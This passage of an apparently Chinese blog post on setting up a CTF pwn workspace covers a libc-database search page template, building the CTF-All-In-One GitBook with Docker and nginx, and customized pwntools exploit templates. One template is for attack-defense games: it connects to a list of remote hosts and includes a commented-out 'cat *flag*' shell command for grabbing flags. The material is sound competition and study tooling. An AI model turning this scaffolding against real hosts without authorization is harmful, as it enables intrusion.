class="string">"page-header"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pull-right"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            View source <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/blukat29/search-libc"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            Powered by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://github.com/niklasb/libc-database"</span>&gt;</span>libc-database<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>libc database search<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-6"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title panel-title-inline"</span>&gt;</span>Query<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"panel-title-right"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?q=_rtld_global%3A0"</span>&gt;</span>show all libs<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                /</span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>start over<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"queries"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-inline"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"query-add"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"query-find"</span> <span class="attr">class</span>=<span class="string">"btn btn-success"</span>&gt;</span>Find<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-6"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          &#123;% if libs %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title"</span>&gt;</span>Matches<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              &#123;% for lib_name in libs %&#125;</span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"lib-item &#123;&#123; 'active' if lib_name == lib &#125;&#125;"</span>&gt;</span></span><br><span class="line">                  &#123;&#123; lib_name &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              &#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">          &#123;% if symbols %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"panel-title panel-title-inline"</span>&gt;</span>&#123;&#123; lib &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"panel-title-right"</span> <span class="attr">href</span>=<span class="string">"/d/&#123;&#123; lib &#125;&#125;.so"</span>&gt;</span>Download<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-condensed table-hover"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Symbol<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Offset<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">th</span>&gt;</span>Difference<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% for name, ofs in symbols %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">"mono-font symbol-row"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"choose-base"</span> <span class="attr">class</span>=<span class="string">"symbol-radio"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-name"</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-ofs"</span>&gt;</span>&#123;&#123; '0x%06x' | format(ofs) &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"symbol-diff"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">              <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"/d/&#123;&#123; lib &#125;&#125;.symbols"</span>&gt;</span>All symbols<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          &#123;% endif %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>Database updated on May 23, 2018.<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='main.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">    &#123;% <span class="keyword">for</span> name, addr <span class="keyword">in</span> query.items() %&#125;</span></span><br><span class="line"><span class="actionscript">    add_query(<span class="string">"&#123;&#123; name &#125;&#125;"</span>, <span class="string">"&#123;&#123; addr &#125;&#125;"</span>);</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='names.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    set_autocomplete(names);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="本地搭建ctf-all-in-one"><a href="#本地搭建ctf-all-in-one" class="headerlink" title="本地搭建ctf-all-in-one"></a>本地搭建ctf-all-in-one</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1pYW5heS9DVEYtQWxsLUluLU9uZQ==" title="https://github.com/firmianay/CTF-All-In-One">https://github.com/firmianay/CTF-All-In-One<i class="fa fa-external-link"></i></span></p><h3 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h3><p>git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zpcm1pYW5heS9DVEYtQWxsLUluLU9uZQ==" title="https://github.com/firmianay/CTF-All-In-One">https://github.com/firmianay/CTF-All-In-One<i class="fa fa-external-link"></i></span></p><h3 id="GitBook基础"><a href="#GitBook基础" class="headerlink" title="GitBook基础"></a>GitBook基础</h3><p>README.md和SUMMARY.md<br>必备文件</p><h3 id="利用Docker安装Gitbook"><a href="#利用Docker安装Gitbook" class="headerlink" title="利用Docker安装Gitbook"></a>利用Docker安装Gitbook</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search gitbook <span class="comment">#可以查看，我用了最高星的那个</span></span><br><span class="line">docker pull fellah/gitbook</span><br></pre></td></tr></table></figure><p>先到项目的目录下<br>然后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v <span class="variable">$PWD</span>:/srv/gitbook -v <span class="variable">$PWD</span>/html:/srv/html fellah/gitbook gitbook build . /srv/html</span><br></pre></td></tr></table></figure><h3 id="展示Gitbook文件"><a href="#展示Gitbook文件" class="headerlink" title="展示Gitbook文件"></a>展示Gitbook文件</h3><p>因为生成的是html静态页面所以需要一个web服务来显示，我用nginx</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br><span class="line">docker run --name ctf-all-in-one -v /<span class="variable">$PWD</span>/html:/usr/share/nginx/html -d -p 4102:80 nginx</span><br></pre></td></tr></table></figure><p>这样就搭建完成了</p><p>访问你自己的4100-4102端口看下，是否成功了</p><h3 id="下载ctf-challenge，例题以及exp"><a href="#下载ctf-challenge，例题以及exp" class="headerlink" title="下载ctf-challenge，例题以及exp"></a>下载ctf-challenge，例题以及exp</h3><p>git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2Vz" title="https://github.com/ctf-wiki/ctf-challenges">https://github.com/ctf-wiki/ctf-challenges<i class="fa fa-external-link"></i></span><br>这个说不定哪天就用上了，说不准</p><h2 id="exp模板构建"><a href="#exp模板构建" class="headerlink" title="exp模板构建"></a>exp模板构建</h2><p>因为要快速做题，每次重复的部分整合起来比较好，所以便研究下exp模板如何弄，我是通过修改pwntools里自带的exp模板，生成自己专属的模板的，我建议都弄成自己的exp模板类型吧，因为每个人代码风格不一样，没必要一定用大佬的模板，当然有可能大佬的模板好，但不一定适合自己</p><h3 id="模板位置"><a href="#模板位置" class="headerlink" title="模板位置"></a>模板位置</h3><p>第一个是模板的具体内容，第二个是生成模板的方法</p><ul><li>pwnup.mako</li><li>template.py</li></ul><p>你可以find / -name 名称<br>找到具体位置，最好先备份一份</p><p>具体配置自行配置，因为每个人风格不同</p><h3 id="pwntools-exp模板自定义"><a href="#pwntools-exp模板自定义" class="headerlink" title="pwntools exp模板自定义"></a>pwntools exp模板自定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%page args=<span class="string">"binary, host=None, port=None, libc=None, local=True"</span>/&gt;\</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.context <span class="keyword">import</span> context <span class="keyword">as</span> ctx</span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.sh_string <span class="keyword">import</span> sh_string</span><br><span class="line"><span class="keyword">from</span> elftools.common.exceptions <span class="keyword">import</span> ELFError</span><br><span class="line"></span><br><span class="line">argv = list(sys.argv)</span><br><span class="line">argv[<span class="number">0</span>] = os.path.basename(argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> binary:</span><br><span class="line">       ctx.binary = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> ELFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> binary:</span><br><span class="line">    binary = <span class="string">'/path/to/binary'</span></span><br><span class="line"></span><br><span class="line">exe = os.path.basename(binary)</span><br><span class="line"><span class="keyword">if</span> binary[<span class="number">0</span>] != <span class="string">'/'</span>:</span><br><span class="line">    binary = <span class="string">"./"</span> + binary</span><br><span class="line">binary_repr = repr(binary)</span><br><span class="line">libc_repr = repr(libc)</span><br><span class="line">%&gt;\</span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">%<span class="keyword">if</span> host:</span><br><span class="line">host = args.HOST <span class="keyword">or</span> $&#123;repr(host)&#125;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">%endif</span><br><span class="line">%<span class="keyword">if</span> port:</span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> $&#123;port&#125;)</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">%endif</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">%<span class="keyword">if</span> ctx.binary:</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe.path'</span> %&gt;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>)</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe'</span> %&gt;</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> s,addr          : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_one_gadget</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line"><span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line">%<span class="keyword">if</span> ctx.binary <span class="keyword">and</span> <span class="keyword">not</span> quiet:</span><br><span class="line"><span class="comment"># $&#123;'%-10s%s-%s-%s' % ('Arch:',</span></span><br><span class="line">                       ctx.binary.arch,</span><br><span class="line">                       ctx.binary.bits,</span><br><span class="line">                       ctx.binary.endian)&#125;</span><br><span class="line">%<span class="keyword">for</span> line <span class="keyword">in</span> ctx.binary.checksec(color=<span class="literal">False</span>).splitlines():</span><br><span class="line"><span class="comment"># $&#123;line&#125;</span></span><br><span class="line">%endfor</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>awd模板</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%page args=<span class="string">"binary, host=None, port=None, libc=None, local=True"</span>/&gt;\</span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwnlib.context <span class="keyword">import</span> context <span class="keyword">as</span> ctx</span><br><span class="line"><span class="keyword">from</span> pwnlib.elf.elf <span class="keyword">import</span> ELF</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.sh_string <span class="keyword">import</span> sh_string</span><br><span class="line"><span class="keyword">from</span> elftools.common.exceptions <span class="keyword">import</span> ELFError</span><br><span class="line"></span><br><span class="line">argv = list(sys.argv)</span><br><span class="line">argv[<span class="number">0</span>] = os.path.basename(argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> binary:</span><br><span class="line">       ctx.binary = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> ELFError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> binary:</span><br><span class="line">    binary = <span class="string">'/path/to/binary'</span></span><br><span class="line"></span><br><span class="line">exe = os.path.basename(binary)</span><br><span class="line"><span class="keyword">if</span> binary[<span class="number">0</span>] != <span class="string">'/'</span>:</span><br><span class="line">    binary = <span class="string">"./"</span> + binary</span><br><span class="line">binary_repr = repr(binary)</span><br><span class="line">libc_repr = repr(libc)</span><br><span class="line">%&gt;\</span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">%<span class="keyword">if</span> host:</span><br><span class="line">host = args.HOST <span class="keyword">or</span> $&#123;repr(host)&#125;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">iplist = [</span><br><span class="line">    <span class="string">'127.0.0.1'</span> </span><br><span class="line">]</span><br><span class="line">%endif</span><br><span class="line">%<span class="keyword">if</span> port:</span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> $&#123;port&#125;)</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">%endif</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">%<span class="keyword">if</span> ctx.binary:</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe.path'</span> %&gt;</span><br><span class="line">%<span class="keyword">else</span>:</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>)</span><br><span class="line">exe = $&#123;binary_repr&#125;</span><br><span class="line">&lt;% binary_repr = <span class="string">'exe'</span> %&gt;</span><br><span class="line">%endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        io = process(exe)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(host,port, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="comment">#don't forget to change it</span></span><br><span class="line">    s    = <span class="keyword">lambda</span> data                                    : io.send(str(data))</span><br><span class="line">    sa   = <span class="keyword">lambda</span> delim,data                              : io.sendafter(str(delim), str(data))</span><br><span class="line">    sl   = <span class="keyword">lambda</span> data                                    : io.sendline(str(data))</span><br><span class="line">    sla  = <span class="keyword">lambda</span> delim,data                              : io.sendlineafter(str(delim), str(data))</span><br><span class="line">    r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>                               : io.recv(numb)</span><br><span class="line">    ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span>                         : io.recvuntil(delim, drop)</span><br><span class="line">    rg   = <span class="keyword">lambda</span> regex                                   : io.recvregex(regex)</span><br><span class="line">    rp   = <span class="keyword">lambda</span> timeout=<span class="number">1</span>                               : io.recvrepeat(timeout)</span><br><span class="line">    uu32 = <span class="keyword">lambda</span> data                                    : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    uu64 = <span class="keyword">lambda</span> data                                    : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    lg   = <span class="keyword">lambda</span> s,addr                                  : io.success(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line">    <span class="comment"># break on aim addr</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> PIE:</span><br><span class="line">            text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">            gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get_one_gadget</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">one_gadget</span><span class="params">(filename)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> map(int, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split(<span class="string">' '</span>))</span><br><span class="line">    <span class="comment">#one_gadget = one_gadget(libc.path)</span></span><br><span class="line">    <span class="comment">#===========================================================</span></span><br><span class="line">    <span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line">    <span class="comment">#===========================================================</span></span><br><span class="line">    %<span class="keyword">if</span> ctx.binary <span class="keyword">and</span> <span class="keyword">not</span> quiet:</span><br><span class="line">    $&#123;<span class="string">'%10s     %s-%s-%s'</span> % (<span class="string">'    # Arch:'</span>,</span><br><span class="line">                           ctx.binary.arch,</span><br><span class="line">                           ctx.binary.bits,</span><br><span class="line">                           ctx.binary.endian)&#125;</span><br><span class="line">    %<span class="keyword">for</span> line <span class="keyword">in</span> ctx.binary.checksec(color=<span class="literal">False</span>).splitlines():</span><br><span class="line">        <span class="comment"># $&#123;line&#125;</span></span><br><span class="line">    %endfor</span><br><span class="line">    %endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    sl("cat *flag*")</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        flag = rp(1)</span></span><br><span class="line"><span class="string">        import re</span></span><br><span class="line"><span class="string">        flag = re.findall("flag&#123;.*?&#125;", flag)[0]</span></span><br><span class="line"><span class="string">        print("flag is: " + flag)</span></span><br><span class="line"><span class="string">    except Exception as e:</span></span><br><span 